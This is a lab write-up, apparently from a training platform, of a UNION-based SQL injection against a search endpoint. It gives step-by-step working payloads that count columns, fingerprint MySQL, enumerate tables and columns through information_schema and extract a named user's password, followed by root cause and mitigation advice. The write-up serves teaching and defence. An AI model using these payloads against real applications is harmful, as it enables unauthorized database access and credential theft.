---
title: "SQL Injection – Credential Extraction via UNION Attack | Search Functionality Lab"
date: 2026-05-02 2:10:00 +0530
categories: [Web Security, Injection]
tags: [sql-injection, union-based, database-enumeration, mysql, authentication-bypass]
platform: BugForge
author: Shivansh Sharma
image:
  path: /assets/images/posts/union-sql-injection-hackviser.webp
  alt: UNION-based SQL Injection credential extraction
---

## Overview

This lab demonstrates a **UNION-based SQL Injection vulnerability** in a search feature. The application directly embeds user input into SQL queries and reflects the results in the response.

By exploiting this behavior, it was possible to enumerate the database structure and extract sensitive user credentials.

---

## Objective

- Identify SQL injection in the search functionality
- Determine the number of columns in the query
- Extract database metadata
- Retrieve the password for the user `oliverlee`

---

## Reconnaissance

The application exposed a search endpoint that returned results dynamically from the database.

This indicated:

- Backend database interaction
- Reflected query output
- Potential for SQL injection

Such endpoints are ideal for **UNION-based attacks**, where attacker-controlled queries are merged with legitimate queries.

---

## Exploitation

### Step 1: Determining Column Count

To perform a UNION attack, the number of columns must match the original query.

```sql
' UNION SELECT NULL, NULL, NULL, NULL-- -
```

To identify which columns are reflected in the response:

```sql
' UNION SELECT 'a', NULL, NULL, NULL-- -
' UNION SELECT NULL, 'a', NULL, NULL-- -
```

**Analysis**

- The query contains 4 columns
- At least one column is reflected in the HTTP response
- This allows controlled data extraction

---

### Step 2: Identifying Database Type

To fingerprint the database:

```sql
' UNION SELECT NULL, database(), NULL, NULL-- -
```

**Result**

- The function executed successfully
- Confirms the backend is **MySQL**

Additional check:

```sql
' UNION SELECT NULL, current_database(), NULL, NULL-- -
```

(This is typically used for PostgreSQL and helps differentiate database engines.)

---

### Step 3: Enumerating Tables

Using MySQL metadata:

```sql
' UNION SELECT NULL, table_name, NULL, NULL 
FROM information_schema.tables-- -
```

**Result**

- A table named `users` was discovered

---

### Step 4: Enumerating Columns

```sql
' UNION SELECT NULL, column_name, NULL, NULL 
FROM information_schema.columns 
WHERE table_name='users'-- -
```

**Result**

Identified important columns including:

- `username`
- `password`

---

### Step 5: Extracting Credentials

```sql
' UNION SELECT NULL, password, NULL, NULL 
FROM users 
WHERE username='oliverlee'-- -
```

**Proof of Exploitation**

The application returned the password associated with the target user:

> Password for `oliverlee` retrieved successfully

This confirms successful data extraction via SQL injection.

---

## Root Cause

The vulnerability exists due to:

- Direct inclusion of user input in SQL queries
- Absence of input validation or sanitization
- Lack of parameterized queries
- Exposure of query results in responses

---

## Impact

An attacker can:

- Enumerate the entire database structure
- Extract sensitive user credentials
- Access or modify application data
- Potentially escalate to full system compromise depending on privileges

---

## Mitigation

### 1. Use Parameterized Queries

Avoid dynamic query construction:

```sql
SELECT * FROM users WHERE username = ?
```

### 2. Input Validation

- Reject unexpected characters
- Enforce strict input formats

### 3. Least Privilege

- Restrict database user permissions
- Prevent access to metadata tables where possible

### 4. Error Handling

- Disable verbose SQL error messages in production
- Avoid exposing query results directly

### 5. Additional Protection

- Implement a Web Application Firewall (WAF)
- Use ORM frameworks that handle query safety

---

## Real-World Insight

UNION-based SQL injection is especially dangerous when:

- Query results are reflected in responses
- Applications expose structured data directly
- Database permissions are overly permissive

In real-world scenarios, this can lead to:

- Credential dumps
- Account takeovers
- Full database compromise

---

## Conclusion

This lab highlights how improper handling of user input in SQL queries can lead to complete database exposure.

Even a simple search feature can become a critical attack vector if secure coding practices are not followed.

Proper query design, input validation, and least privilege principles are essential to prevent SQL injection attacks.